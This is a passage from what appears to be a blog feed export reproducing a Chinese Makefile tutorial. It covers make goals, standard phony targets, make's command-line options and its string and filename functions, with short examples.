href="https://seisman.github.io/how-to-write-makefile/invoke.html#id2">¶</a></h2><p>一般来说，make的最终目标是makefile中的第一个目标，而其它目标一般是由这个目标连带出来的。这是make的默认行为。当然，一般来说，你的makefile中的第一个目标是由许多个目标组成，你可以指示make，让其完成你所指定的目标。要达到这一目的很简单，需在make命令后直接跟目标的名字就可以完成（如前面提到的“make clean”形式）</p><p>任何在makefile中的目标都可以被指定成终极目标，但是除了以 <code>-</code> 打头，或是包含了 <code>=</code> 的目标，因为有这些字符的目标，会被解析成命令行参数或是变量。甚至没有被我们明确写出来的目标也可以成为make的终极目标，也就是说，只要make可以找到其隐含规则推导规则，那么这个隐含目标同样可以被指定成终极目标。</p><p>有一个make的环境变量叫 <code>MAKECMDGOALS</code> ，这个变量中会存放你所指定的终极目标的列表，如果在命令行上，你没有指定目标，那么，这个变量是空值。这个变量可以让你使用在一些比较特殊的情形下。比如下面的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sources = foo.c bar.c</span><br><span class="line">ifneq ( $(MAKECMDGOALS),clean)</span><br><span class="line">    include $(sources:.c=.d)</span><br><span class="line">endif</span><br></pre></td></tr></table></figure><p>基于上面的这个例子，只要我们输入的命令不是“make clean”，那么makefile会自动包含“foo.d”和“bar.d”这两个makefile。</p><p>使用指定终极目标的方法可以很方便地让我们编译我们的程序，例如下面这个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.PHONY: all</span><br><span class="line">all: prog1 prog2 prog3 prog4</span><br></pre></td></tr></table></figure><p>从这个例子中，我们可以看到，这个makefile中有四个需要编译的程序——“prog1”， “prog2”，“prog3”和 “prog4”，我们可以使用“make all”命令来编译所有的目标（如果把all置成第一个目标，那么只需执行“make”），我们也可以使用 “make prog2”来单独编译目标“prog2”。</p><p>即然make可以指定所有makefile中的目标，那么也包括“伪目标”，于是我们可以根据这种性质来让我们的makefile根据指定的不同的目标来完成不同的事。在Unix世界中，软件发布时，特别是GNU这种开源软件的发布时，其makefile都包含了编译、安装、打包等功能。我们可以参照这种规则来书写我们的makefile中的目标。</p><ul><li>all:这个伪目标是所有目标的目标，其功能一般是编译所有的目标。</li><li>clean:这个伪目标功能是删除所有被make创建的文件。</li><li>install:这个伪目标功能是安装已编译好的程序，其实就是把目标执行文件拷贝到指定的目标中去。</li><li>print:这个伪目标的功能是例出改变过的源文件。</li><li>tar:这个伪目标功能是把源程序打包备份。也就是一个tar文件。</li><li>dist:这个伪目标功能是创建一个压缩文件，一般是把tar文件压成Z文件。或是gz文件。</li><li>TAGS:这个伪目标功能是更新所有的目标，以备完整地重编译使用。</li><li>check和test:这两个伪目标一般用来测试makefile的流程。</li></ul><p>当然一个项目的makefile中也不一定要书写这样的目标，这些东西都是GNU的东西，但是我想，GNU搞出这些东西一定有其可取之处（等你的 UNIX下的程序文件一多时你就会发现这些功能很有用了），这里只不过是说明了，如果你要书写这种功能，最好使用这种名字命名你的目标，这样规范一些，规范的好处就是——不用解释，大家都明白。而且如果你的makefile中有这些功能，一是很实用，二是可以显得你的makefile很专业（不是那种初学者的作品）。</p><h2 id="检查规则">检查规则<a href="https://seisman.github.io/how-to-write-makefile/invoke.html#id3">¶</a></h2><p>有时候，我们不想让我们的makefile中的规则执行起来，我们只想检查一下我们的命令，或是执行的序列。于是我们可以使用make命令的下述参数：</p><ul><li><p><code>-n</code>, <code>--just-print</code>, <code>--dry-run</code>, <code>--recon</code></p><p>不执行参数，这些参数只是打印命令，不管目标是否更新，把规则和连带规则下的命令打印出来，但不执行，这些参数对于我们调试makefile很有用处。</p></li><li><p><code>-t</code>, <code>--touch</code></p><p>这个参数的意思就是把目标文件的时间更新，但不更改目标文件。也就是说，make假装编译目标，但不是真正的编译目标，只是把目标变成已编译过的状态。</p></li><li><p><code>-q</code>, <code>--question</code></p><p>这个参数的行为是找目标的意思，也就是说，如果目标存在，那么其什么也不会输出，当然也不会执行编译，如果目标不存在，其会打印出一条出错信息。</p></li><li><p><code>-W &lt;file&gt;</code>, <code>--what-if=&lt;file&gt;</code>, <code>--assume-new=&lt;file&gt;</code>, <code>--new-file=&lt;file&gt;</code></p><p>这个参数需要指定一个文件。一般是是源文件（或依赖文件），Make会根据规则推导来运行依赖于这个文件的命令，一般来说，可以和“-n”参数一同使用，来查看这个依赖文件所发生的规则命令。</p></li></ul><p>另外一个很有意思的用法是结合 <code>-p</code> 和 <code>-v</code> 来输出makefile被执行时的信息（这个将在后面讲述）。</p><h2 id="make的参数">make的参数<a href="https://seisman.github.io/how-to-write-makefile/invoke.html#id4">¶</a></h2><p>下面列举了所有GNU make 3.80版的参数定义。其它版本和产商的make大同小异，不过其它产商的make的具体参数还是请参考各自的产品文档。</p><ul><li><p><code>-b</code>, <code>-m</code></p><p>这两个参数的作用是忽略和其它版本make的兼容性。</p></li><li><p><code>-B</code>, <code>--always-make</code></p><p>认为所有的目标都需要更新（重编译）。</p></li><li><p><code>-C</code> <em><dir></em>, <code>--directory</code>=<em><dir></em></p><p>指定读取makefile的目录。如果有多个“-C”参数，make的解释是后面的路径以前面的作为相对路径，并以最后的目录作为被指定目录。如：“make -C ~hchen/test -C prog”等价于“make -C ~hchen/test/prog”。</p></li><li><p><code>-debug</code>[=<em><options></em>]</p><p>输出make的调试信息。它有几种不同的级别可供选择，如果没有参数，那就是输出最简单的调试信息。下面是<options>的取值：a: 也就是all，输出所有的调试信息。（会非常的多）b: 也就是basic，只输出简单的调试信息。即输出不需要重编译的目标。v: 也就是verbose，在b选项的级别之上。输出的信息包括哪个makefile被解析，不需要被重编译的依赖文件（或是依赖目标）等。i: 也就是implicit，输出所有的隐含规则。j: 也就是jobs，输出执行规则中命令的详细信息，如命令的PID、返回码等。m: 也就是makefile，输出make读取makefile，更新makefile，执行makefile的信息。</p></li><li><p><code>-d</code></p><p>相当于“–debug=a”。</p></li><li><p><code>-e</code>, <code>--environment-overrides</code></p><p>指明环境变量的值覆盖makefile中定义的变量的值。</p></li><li><p><code>-f</code>=<em><file></em>, <code>--file</code>=<em><file></em>, <code>--makefile</code>=<em><file></em></p><p>指定需要执行的makefile。</p></li><li><p><code>-h</code>, <code>--help</code></p><p>显示帮助信息。</p></li><li><p><code>-i</code> , <code>--ignore-errors</code></p><p>在执行时忽略所有的错误。</p></li><li><p><code>-I</code> <em><dir></em>, <code>--include-dir</code>=<em><dir></em></p><p>指定一个被包含makefile的搜索目标。可以使用多个“-I”参数来指定多个目录。</p></li><li><p><code>-j</code> [<em><jobsnum></em>], <code>--jobs</code>[=<em><jobsnum></em>]</p><p>指同时运行命令的个数。如果没有这个参数，make运行命令时能运行多少就运行多少。如果有一个以上的“-j”参数，那么仅最后一个“-j”才是有效的。（注意这个参数在MS-DOS中是无用的）</p></li><li><p><code>-k</code>, <code>--keep-going</code></p><p>出错也不停止运行。如果生成一个目标失败了，那么依赖于其上的目标就不会被执行了。</p></li><li><p><code>-l</code> <em><load></em>, <code>--load-average</code>[=<em><load></em>], <code>-max-load</code>[=<em><load></em>]</p><p>指定make运行命令的负载。</p></li><li><p><code>-n</code>, <code>--just-print</code>, <code>--dry-run</code>, <code>--recon</code></p><p>仅输出执行过程中的命令序列，但并不执行。</p></li><li><p><code>-o</code> <em><file></em>, <code>--old-file</code>=<em><file></em>, <code>--assume-old</code>=<em><file></em></p><p>不重新生成的指定的<file>，即使这个目标的依赖文件新于它。</p></li><li><p><code>-p</code>, <code>--print-data-base</code></p><p>输出makefile中的所有数据，包括所有的规则和变量。这个参数会让一个简单的makefile都会输出一堆信息。如果你只是想输出信息而不想执行makefile，你可以使用“make -qp”命令。如果你想查看执行makefile前的预设变量和规则，你可以使用 “make –p –f /dev/null”。这个参数输出的信息会包含着你的makefile文件的文件名和行号，所以，用这个参数来调试你的 makefile会是很有用的，特别是当你的环境变量很复杂的时候。</p></li><li><p><code>-q</code>, <code>--question</code></p><p>不运行命令，也不输出。仅仅是检查所指定的目标是否需要更新。如果是0则说明要更新，如果是2则说明有错误发生。</p></li><li><p><code>-r</code>, <code>--no-builtin-rules</code></p><p>禁止make使用任何隐含规则。</p></li><li><p><code>-R</code>, <code>--no-builtin-variabes</code></p><p>禁止make使用任何作用于变量上的隐含规则。</p></li><li><p><code>-s</code>, <code>--silent</code>, <code>--quiet</code></p><p>在命令运行时不输出命令的输出。</p></li><li><p><code>-S</code>, <code>--no-keep-going</code>, <code>--stop</code></p><p>取消“-k”选项的作用。因为有些时候，make的选项是从环境变量“MAKEFLAGS”中继承下来的。所以你可以在命令行中使用这个参数来让环境变量中的“-k”选项失效。</p></li><li><p><code>-t</code>, <code>--touch</code></p><p>相当于UNIX的touch命令，只是把目标的修改日期变成最新的，也就是阻止生成目标的命令运行。</p></li><li><p><code>-v</code>, <code>--version</code></p><p>输出make程序的版本、版权等关于make的信息。</p></li><li><p><code>-w</code>, <code>--print-directory</code></p><p>输出运行makefile之前和之后的信息。这个参数对于跟踪嵌套式调用make时很有用。</p></li><li><p><code>--no-print-directory</code></p><p>禁止“-w”选项。</p></li><li><p><code>-W</code> <em><file></em>, <code>--what-if</code>=<em><file></em>, <code>--new-file</code>=<em><file></em>, <code>--assume-file</code>=<em><file></em></p><p>假定目标<file>;需要更新，如果和“-n”选项使用，那么这个参数会输出该目标更新时的运行动作。如果没有“-n”那么就像运行UNIX的“touch”命令一样，使得<file>;的修改时间为当前时间。</p></li><li><p><code>--warn-undefined-variables</code></p><p>只要make发现有未定义的变量，那么就输出警告信息。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile使用函数</title>
      <link href="/2024/04/26/Security/binary/Makefile/6.%E4%BD%BF%E7%94%A8%E5%87%BD%E6%95%B0/"/>
      <url>/2024/04/26/Security/binary/Makefile/6.%E4%BD%BF%E7%94%A8%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="使用函数">使用函数<a href="https://seisman.github.io/how-to-write-makefile/functions.html#id1">¶</a></h1><p>在Makefile中可以使用函数来处理变量，从而让我们的命令或是规则更为的灵活和具有智能。make 所支持的函数也不算很多，不过已经足够我们的操作了。函数调用后，函数的返回值可以当做变量来使用。</p><h2 id="函数的调用语法">函数的调用语法<a href="https://seisman.github.io/how-to-write-makefile/functions.html#id2">¶</a></h2><p>函数调用，很像变量的使用，也是以 <code>$</code> 来标识的，其语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&lt;function&gt; &lt;arguments&gt;)</span><br></pre></td></tr></table></figure><p>或是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&lt;function&gt; &lt;arguments&gt;&#125;</span><br></pre></td></tr></table></figure><p>这里， <code>&lt;function&gt;</code> 就是函数名，make支持的函数不多。 <code>&lt;arguments&gt;</code> 为函数的参数，参数间以逗号 <code>,</code> 分隔，而函数名和参数之间以“空格”分隔。函数调用以 <code>$</code> 开头，以圆括号或花括号把函数名和参数括起。感觉很像一个变量，是不是？函数中的参数可以使用变量，为了风格的统一，函数和变量的括号最好一样，如使用 <code>$(subst a,b,$(x))</code> 这样的形式，而不是 <code>$(subst a,b, $&#123;x&#125;)</code> 的形式。因为统一会更清楚，也会减少一些不必要的麻烦。</p><p>还是来看一个示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">comma:= ,</span><br><span class="line">empty:=</span><br><span class="line">space:= $(empty) $(empty)</span><br><span class="line">foo:= a b c</span><br><span class="line">bar:= $(subst $(space),$(comma),$(foo))</span><br></pre></td></tr></table></figure><p>在这个示例中， <code>$(comma)</code> 的值是一个逗号。 <code>$(space)</code> 使用了 <code>$(empty)</code> 定义了一个空格， <code>$(foo)</code> 的值是 <code>a b c</code> ， <code>$(bar)</code> 的定义用，调用了函数 <code>subst</code> ，这是一个替换函数，这个函数有三个参数，第一个参数是被替换字串，第二个参数是替换字串，第三个参数是替换操作作用的字串。这个函数也就是把 <code>$(foo)</code> 中的空格替换成逗号，所以 <code>$(bar)</code> 的值是 <code>a,b,c</code> 。</p><h2 id="字符串处理函数">字符串处理函数<a href="https://seisman.github.io/how-to-write-makefile/functions.html#id3">¶</a></h2><h3 id="subst">subst<a href="https://seisman.github.io/how-to-write-makefile/functions.html#subst">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(subst &lt;from&gt;,&lt;to&gt;,&lt;text&gt;)</span><br></pre></td></tr></table></figure><ul><li><p>名称：字符串替换函数</p></li><li><p>功能：把字串 <code>&lt;text&gt;</code> 中的 <code>&lt;from&gt;</code> 字符串替换成 <code>&lt;to&gt;</code> 。</p></li><li><p>返回：函数返回被替换过后的字符串。</p></li><li><p>示例：</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(subst ee,EE,feet on the street)</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>把 <code>feet on the street</code> 中的 <code>ee</code> 替换成 <code>EE</code> ，返回结果是 <code>fEEt on the strEEt</code> 。</p><h3 id="patsubst">patsubst<a href="https://seisman.github.io/how-to-write-makefile/functions.html#patsubst">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(patsubst &lt;pattern&gt;,&lt;replacement&gt;,&lt;text&gt;)</span><br></pre></td></tr></table></figure><ul><li><p>名称：模式字符串替换函数。</p></li><li><p>功能：查找 <code>&lt;text&gt;</code> 中的单词（单词以“空格”、“Tab”或“回车”“换行”分隔）是否符合模式 <code>&lt;pattern&gt;</code> ，如果匹配的话，则以 <code>&lt;replacement&gt;</code> 替换。这里， <code>&lt;pattern&gt;</code> 可以包括通配符 <code>%</code> ，表示任意长度的字串。如果 <code>&lt;replacement&gt;</code> 中也包含 <code>%</code> ，那么， <code>&lt;replacement&gt;</code> 中的这个 <code>%</code> 将是 <code>&lt;pattern&gt;</code> 中的那个 <code>%</code> 所代表的字串。（可以用 <code>\</code> 来转义，以 <code>\%</code> 来表示真实含义的 <code>%</code> 字符）</p></li><li><p>返回：函数返回被替换过后的字符串。</p></li><li><p>示例：</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(patsubst %.c,%.o,x.c.c bar.c)</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>把字串 <code>x.c.c bar.c</code> 符合模式 <code>%.c</code> 的单词替换成 <code>%.o</code> ，返回结果是 <code>x.c.o bar.o</code></p><ul><li><p>备注：这和我们前面“变量章节”说过的相关知识有点相似。如 <code>$(var:&lt;pattern&gt;=&lt;replacement&gt;;)</code> 相当于 <code>$(patsubst &lt;pattern&gt;,&lt;replacement&gt;,$(var))</code> ，而 <code>$(var: &lt;suffix&gt;=&lt;replacement&gt;)</code> 则相当于 <code>$(patsubst %&lt;suffix&gt;,%&lt;replacement&gt;,$(var))</code> 。</p><p>例如有:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objects = foo.o bar.o baz.o，</span><br></pre></td></tr></table></figure><p>那么， <code>$(objects:.o=.c)</code> 和 <code>$(patsubst %.o,%.c,$(objects))</code> 是一样的。</p></li></ul><h3 id="strip">strip<a href="https://seisman.github.io/how-to-write-makefile/functions.html#strip">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(strip &lt;string&gt;)</span><br></pre></td></tr></table></figure><ul><li><p>名称：去空格函数。</p></li><li><p>功能：去掉 <code>&lt;string&gt;</code> 字串中开头和结尾的空字符。</p></li><li><p>返回：返回被去掉空格的字符串值。</p></li><li><p>示例：</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(strip a b c )</span><br></pre></td></tr></table></figure></blockquote><p>把字串 <code>a b c</code> 去掉开头和结尾的空格，结果是 <code>a b c</code>。</p></li></ul><h3 id="findstring">findstring<a href="https://seisman.github.io/how-to-write-makefile/functions.html#findstring">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(findstring &lt;find&gt;,&lt;in&gt;)</span><br></pre></td></tr></table></figure><ul><li><p>名称：查找字符串函数</p></li><li><p>功能：在字串 <code>&lt;in&gt;</code> 中查找 <code>&lt;find&gt;</code> 字串。</p></li><li><p>返回：如果找到，那么返回 <code>&lt;find&gt;</code> ，否则返回空字符串。</p></li><li><p>示例：</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(findstring a,a b c)</span><br><span class="line">$(findstring a,b c)</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>第一个函数返回 <code>a</code> 字符串，第二个返回空字符串</p><h3 id="filter">filter<a href="https://seisman.github.io/how-to-write-makefile/functions.html#filter">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(filter &lt;pattern...&gt;,&lt;text&gt;)</span><br></pre></td></tr></table></figure><ul><li><p>名称：过滤函数</p></li><li><p>功能：以 <code>&lt;pattern&gt;</code> 模式过滤 <code>&lt;text&gt;</code> 字符串中的单词，保留符合模式 <code>&lt;pattern&gt;</code> 的单词。可以有多个模式。</p></li><li><p>返回：返回符合模式 <code>&lt;pattern&gt;</code> 的字串。</p></li><li><p>示例：</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sources := foo.c bar.c baz.s ugh.h</span><br><span class="line">foo: $(sources)</span><br><span class="line">    cc $(filter %.c %.s,$(sources)) -o foo</span><br></pre></td></tr></table></figure></blockquote><p><code>$(filter %.c %.s,$(sources))</code> 返回的值是 <code>foo.c bar.c baz.s</code> 。</p></li></ul><h3 id="filter-out">filter-out<a href="https://seisman.github.io/how-to-write-makefile/functions.html#filter-out">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(filter-out &lt;pattern...&gt;,&lt;text&gt;)</span><br></pre></td></tr></table></figure><ul><li><p>名称：反过滤函数</p></li><li><p>功能：以 <code>&lt;pattern&gt;</code> 模式过滤 <code>&lt;text&gt;</code> 字符串中的单词，去除符合模式 <code>&lt;pattern&gt;</code> 的单词。可以有多个模式。</p></li><li><p>返回：返回不符合模式 <code>&lt;pattern&gt;</code> 的字串。</p></li><li><p>示例：</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objects=main1.o foo.o main2.o bar.o</span><br><span class="line">mains=main1.o main2.o</span><br></pre></td></tr></table></figure></blockquote><p><code>$(filter-out $(mains),$(objects))</code> 返回值是 <code>foo.o bar.o</code> 。</p></li></ul><h3 id="sort">sort<a href="https://seisman.github.io/how-to-write-makefile/functions.html#sort">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(sort &lt;list&gt;)</span><br></pre></td></tr></table></figure><ul><li>名称：排序函数</li><li>功能：给字符串 <code>&lt;list&gt;</code> 中的单词排序（升序）。</li><li>返回：返回排序后的字符串。</li><li>示例： <code>$(sort foo bar lose)</code> 返回 <code>bar foo lose</code> 。</li><li>备注： <code>sort</code> 函数会去掉 <code>&lt;list&gt;</code> 中相同的单词。</li></ul><h3 id="word">word<a href="https://seisman.github.io/how-to-write-makefile/functions.html#word">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(word &lt;n&gt;,&lt;text&gt;)</span><br></pre></td></tr></table></figure><ul><li>名称：取单词函数</li><li>功能：取字符串 <code>&lt;text&gt;</code> 中第 <code>&lt;n&gt;</code> 个单词。（从一开始）</li><li>返回：返回字符串 <code>&lt;text&gt;</code> 中第 <code>&lt;n&gt;</code> 个单词。如果 <code>&lt;n&gt;</code> 比 <code>&lt;text&gt;</code> 中的单词数要大，那么返回空字符串。</li><li>示例： <code>$(word 2, foo bar baz)</code> 返回值是 <code>bar</code> 。</li></ul><h3 id="wordlist">wordlist<a href="https://seisman.github.io/how-to-write-makefile/functions.html#wordlist">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(wordlist &lt;ss&gt;,&lt;e&gt;,&lt;text&gt;)</span><br></pre></td></tr></table></figure><ul><li>名称：取单词串函数</li><li>功能：从字符串 <code>&lt;text&gt;</code> 中取从 <code>&lt;ss&gt;</code> 开始到 <code>&lt;e&gt;</code> 的单词串。 <code>&lt;ss&gt;</code> 和 <code>&lt;e&gt;</code> 是一个数字。</li><li>返回：返回字符串 <code>&lt;text&gt;</code> 中从 <code>&lt;ss&gt;</code> 到 <code>&lt;e&gt;</code> 的单词字串。如果 <code>&lt;ss&gt;</code> 比 <code>&lt;text&gt;</code> 中的单词数要大，那么返回空字符串。如果 <code>&lt;e&gt;</code> 大于 <code>&lt;text&gt;</code> 的单词数，那么返回从 <code>&lt;ss&gt;</code> 开始，到 <code>&lt;text&gt;</code> 结束的单词串。</li><li>示例： <code>$(wordlist 2, 3, foo bar baz)</code> 返回值是 <code>bar baz</code> 。</li></ul><h3 id="words">words<a href="https://seisman.github.io/how-to-write-makefile/functions.html#words">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(words &lt;text&gt;)</span><br></pre></td></tr></table></figure><ul><li>名称：单词个数统计函数</li><li>功能：统计 <code>&lt;text&gt;</code> 中字符串中的单词个数。</li><li>返回：返回 <code>&lt;text&gt;</code> 中的单词数。</li><li>示例： <code>$(words, foo bar baz)</code> 返回值是 <code>3</code> 。</li><li>备注：如果我们要取 <code>&lt;text&gt;</code> 中最后的一个单词，我们可以这样： <code>$(word $(words &lt;text&gt;),&lt;text&gt;)</code> 。</li></ul><h3 id="firstword">firstword<a href="https://seisman.github.io/how-to-write-makefile/functions.html#firstword">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(firstword &lt;text&gt;)</span><br></pre></td></tr></table></figure><ul><li>名称：首单词函数——firstword。</li><li>功能：取字符串 <code>&lt;text&gt;</code> 中的第一个单词。</li><li>返回：返回字符串 <code>&lt;text&gt;</code> 的第一个单词。</li><li>示例： <code>$(firstword foo bar)</code> 返回值是 <code>foo</code>。</li><li>备注：这个函数可以用 <code>word</code> 函数来实现： <code>$(word 1,&lt;text&gt;)</code> 。</li></ul><p>以上，是所有的字符串操作函数，如果搭配混合使用，可以完成比较复杂的功能。这里，举一个现实中应用的例子。我们知道，make使用 <code>VPATH</code> 变量来指定“依赖文件”的搜索路径。于是，我们可以利用这个搜索路径来指定编译器对头文件的搜索路径参数 <code>CFLAGS</code> ，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override CFLAGS += $(patsubst %,-I%,$(subst :, ,$(VPATH)))</span><br></pre></td></tr></table></figure><p>如果我们的 <code>$(VPATH)</code> 值是 <code>src:../headers</code> ，那么 <code>$(patsubst %,-I%,$(subst :, ,$(VPATH)))</code> 将返回 <code>-Isrc -I../headers</code> ，这正是cc或gcc搜索头文件路径的参数。</p><h2 id="文件名操作函数">文件名操作函数<a href="https://seisman.github.io/how-to-write-makefile/functions.html#id4">¶</a></h2><p>下面我们要介绍的函数主要是处理文件名的。每个函数的参数字符串都会被当做一个或是一系列的文件名来对待。</p><h3 id="dir">dir<a href="https://seisman.github.io/how-to-write-makefile/functions.html#dir">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(dir &lt;names...&gt;)</span><br></pre></td></tr></table></figure><ul><li>名称：取目录函数——dir。</li><li>功能：从文件名序列 <code>&lt;names&gt;</code> 中取出目录部分。目录部分是指最后一个反斜杠（ <code>/</code> ）之前的部分。如果没有反斜杠，那么返回 <code>./</code> 。</li><li>返回：返回文件名序列 <code>&lt;names&gt;</code> 的目录部分。</li><li>示例： <code>$(dir src/foo.c hacks)</code> 返回值是 <code>src/ ./</code> 。</li></ul><h3 id="notdir">notdir<a href="https://seisman.github.io/how-to-write-makefile/functions.html#notdir">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(notdir &lt;names...&gt;)</span><br></pre></td></tr></table></figure><ul><li>名称：取文件函数——notdir。</li><li>功能：从文件名序列 <code>&lt;names&gt;</code> 中取出非目录部分。非目录部分是指最後一个反斜杠（ <code>/</code> ）之后的部分。</li><li>返回：返回文件名序列 <code>&lt;names&gt;</code> 的非目录部分。</li><li>示例: <code>$(notdir src/foo.c hacks)</code> 返回值是 <code>foo.c hacks</code> 。</li></ul><h3 id="suffix">suffix<a href="https://seisman.github.io/how-to-write-makefile/functions.html#suffix">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(suffix &lt;names...&gt;)</span><br></pre></td></tr></table></figure><ul><li>名称：取後缀函数——suffix。</li><li>功能：从文件名序列 <code>&lt;names&gt;</code> 中取出各个文件名的后缀。</li><li>返回：返回文件名序列 <code>&lt;names&gt;</code> 的后缀序列，如果文件没有后缀，则返回空字串。</li><li>示例： <code>$(suffix src/foo.c src-1.0/bar.c hacks)</code> 返回值是 <code>.c .c</code>。</li></ul><h3 id="basename">basename<a href="https://seisman.github.io/how-to-write-makefile/functions.html#basename">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(basename &lt;names...&gt;)</span><br></pre></td></tr></table></figure><ul><li>名称：取前缀函数——basename。</li><li>功能：从文件名序列 <code>&lt;names&gt;</code> 中取出各个文件名的前缀部分。</li><li>返回：返回文件名序列 <code>&lt;names&gt;</code> 的前缀序列，如果文件没有前缀，则返回空字串。</li><li>示例： <code>$(basename src/foo.c src-1.0/bar.c hacks)</code> 返回值是 <code>src/foo src-1.0/bar hacks</code> 。</li></ul><h3 id="addsuffix">addsuffix<a href="https://seisman.github.io/how-to-write-makefile/functions.html#addsuffix">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(addsuffix &lt;suffix&gt;,&lt;names...&gt;)</span><br></pre></td></tr></table></figure><ul><li>名称：加后缀函数——addsuffix。</li><li>功能：把后缀 <code>&lt;suffix&gt;</code> 加到 <code>&lt;names&gt;</code> 中的每个单词后面。</li><li>返回：返回加过后缀的文件名序列。</li><li>示例： <code>$(addsuffix .c,foo bar)</code> 返回值是 <code>foo.c bar.c</code> 。</li></ul><h3 id="addprefix">addprefix<a href="https://seisman.github.io/how-to-write-makefile/functions.html#addprefix">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(addprefix &lt;prefix&gt;,&lt;names...&gt;)</span><br></pre></td></tr></table></figure><ul><li>名称：加前缀函数——addprefix。</li><li>功能：把前缀 <code>&lt;prefix&gt;</code> 加到 <code>&lt;names&gt;</code> 中的每个单词前面。</li><li>返回：返回加过前缀的文件名序列。</li><li>示例： <code>$(addprefix src/,foo bar)</code> 返回值是 <code>src/foo src/bar</code> 。</li></ul><h3 id="join">join<a href="https://seisman.github.io/how-to-write-makefile/functions.html#join">¶</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(join &lt;list1&gt;,&lt;list2&gt;)</span><br></pre></td></tr></table></figure><ul><li>名称：连接函数——join。</li><li>功能：把 <code>&lt;list2&gt;</code> 中的单词对应地加到 <code>&lt;list1&gt;</code> 的单词后面。如果 <code>&lt;list1&gt;</code> 的单词个数要比 <code>&lt;list2&gt;</code> 的多，那么， <code>&lt;list1&gt;</code> 中的多出来的单词将保持原样。如果 <code>&lt;list2&gt;</code> 的单词个数要比 <code>&lt;list1&gt;</code> 多，那么， <code>&lt;list2&gt;</code> 多出来的单词将被复制到 <code>&lt;list1&gt;</code> 中。</li><li>返回：返回连接过后的字符串。</li><li>示例： <code>$(join aaa bbb , 111 222 333)</code> 返回值是 <code>aaa111 bbb222 333</code> 。</li></ul><h2 id="foreach-函数">foreach 函数<a 